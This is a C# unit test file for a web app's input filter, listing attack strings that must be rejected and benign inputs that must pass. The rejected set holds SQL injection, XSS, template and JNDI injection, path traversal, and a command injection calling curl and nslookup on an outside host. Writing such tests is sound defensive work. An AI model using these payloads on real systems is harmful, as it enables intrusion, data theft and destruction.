using DirectoryManager.Web.Helpers;

namespace DirectoryManager.Web.Tests.Security
{
    public class SuspiciousInputGuardTests
    {
        [Theory]
        [InlineData("' OR '1'='1'-- -")]
        [InlineData("' AND 1=CONVERT(int,@@version)--")]
        [InlineData("1')")]
        [InlineData("MainSponsor')")]
        [InlineData("8 AND EXTRACTVALUE(4149028652108671005,CONCAT(0x7e,((SELECT (ELT(4149028652108671005=4149028652108671005,1)))),0x7e))")]
        [InlineData("1 UNION SELECT null,null,version()--")]
        [InlineData("1 UNION ALL SELECT username, password FROM users")]
        [InlineData("1/**/UNION/**/SELECT/**/1,2,3")]
        [InlineData("1+union+select+1,2")]
        [InlineData("x'; DROP TABLE \"DirectoryEntries\";--")]
        [InlineData("1; SELECT pg_sleep(10)")]
        [InlineData("1' AND SLEEP(5) AND 'a'='a")]
        [InlineData("1 WAITFOR DELAY '0:0:5'")]
        [InlineData("1 or 1=1")]
        [InlineData("MAKE_SET(6602=8941,0x686d584f)")]
        [InlineData("x select * from users")]
        [InlineData("select name, email from members")]
        [InlineData("(select count(*) from pg_user)")]
        [InlineData("admin'--")]
        [InlineData("x' ORDER BY 5--")]
        [InlineData("(select table_name from information_schema.tables)")]
        [InlineData("%27%20OR%20%271%27%3D%271")]
        [InlineData("%2527%2520OR%25201%253D1")]
        [InlineData("<script>alert(1)</script>")]
        [InlineData("\"><svg/onload=confirm(1)>")]
        [InlineData("jaVasCript:/*-/*/`/'/\"/**/(/ */oNcliCk=confirm(1) )//")]
        [InlineData("<img src=x onerror=alert(1)>")]
        [InlineData("{{7*7}}")]
        [InlineData("iEPe ORDER BY 1-- xjqX")]
        [InlineData("-1 OR 5*5=25")]
        [InlineData("e9708862<")]
        [InlineData("moneroswapper.com\">")]
        [InlineData(";env;")]
        [InlineData("C:\\Windows\\System32\\drivers\\etc\\services::$DATA")]
        [InlineData("|(nslookup -q=cname x.bxss.me||curl x.bxss.me)")]
        [InlineData("e&echo tdjakq$()\\ wwpftq")]
        [InlineData("'+response.write(9568503*9055721)+'")]
        [InlineData("e\\u0022onmouseover=mqpT(95923)\\u0022")]
        [InlineData("e\" qJ8E=6MMS([!+!]) aCy=\"")]
        [InlineData("bfgx9613%C0%BEz1%C0%BCz2a%90bcxhjl9613")]
        [InlineData("RLIKE (SELECT (CASE WHEN (9218=6612) THEN '' ELSE 0x28 END))")]
        [InlineData("AND (SELECT (CASE WHEN (9034=9034) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9034) END) FROM DUAL) IS NULL-")]
        [InlineData("${jndi:ldap://x/a}")]
        [InlineData("../../../../etc/passwd")]
        [InlineData("abc\u0000def")]
        public void FindViolation_AttackProbes_AreRejected(string input)
        {
            Assert.NotNull(SuspiciousInputGuard.FindViolation(input));
        }

        [Theory]
        [InlineData("monero")]
        [InlineData("vpn")]
        [InlineData("O'Reilly books")]
        [InlineData("rock 'n' roll")]
        [InlineData("buy and sell monero")]
        [InlineData("swap or exchange")]
        [InlineData("Trocador - Swap")]
        [InlineData("select a wallet")]
        [InlineData("union bank")]
        [InlineData("how to select from many exchanges")]
        [InlineData("C++ developers")]
        [InlineData("50% off (limited)")]
        [InlineData("café münchen")]
        [InlineData("монеро обмен")]
        [InlineData("cake wallet & monerujo")]
        [InlineData("user@example.com")]
        [InlineData("Western union")]
        [InlineData("https://www.altcoinstalks.com/index.php?board=6.0")]
        [InlineData("\"private space\"")]
        [InlineData("set of dishes")]
        [InlineData("order by phone")]
        [InlineData("`https://3g2upl4pq6kufc4m.onion`")]
        [InlineData("\"El poder de las palabras\" Mariano Sigman")]
        [InlineData("Linux+ and LPIC-1 Guide to Linux Certification | 6")]
        [InlineData("print shop")]
        [InlineData("cat food & toys")]
        [InlineData("id card printing")]
        [InlineData("system administrator")]
        [InlineData("0xEF0c5b9E0E9643937D75C229648158584A8CD8D2")]
        [InlineData("888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhwMVgN5S9cQUiyoogDavup3H")]
        [InlineData("https://example.com/path?a=1&b=2")]
        [InlineData("/account/login")]
        [InlineData("1,2")]
        [InlineData("MainSponsor")]
        [InlineData("2026-10-11")]
        [InlineData("#monero")]
        [InlineData("don't")]
        [InlineData("5 x 5 = 25")]
        [InlineData("version 2 (beta)")]
        [InlineData("")]
        [InlineData(null)]
        public void FindViolation_OrdinaryInput_IsAllowed(string? input)
        {
            Assert.Null(SuspiciousInputGuard.FindViolation(input));
        }

        [Fact]
        public void FindViolation_OverlongValue_IsRejected()
        {
            Assert.Equal("value-too-long", SuspiciousInputGuard.FindViolation(new string('a', SuspiciousInputGuard.MaxValueLength + 1)));
        }
    }
}
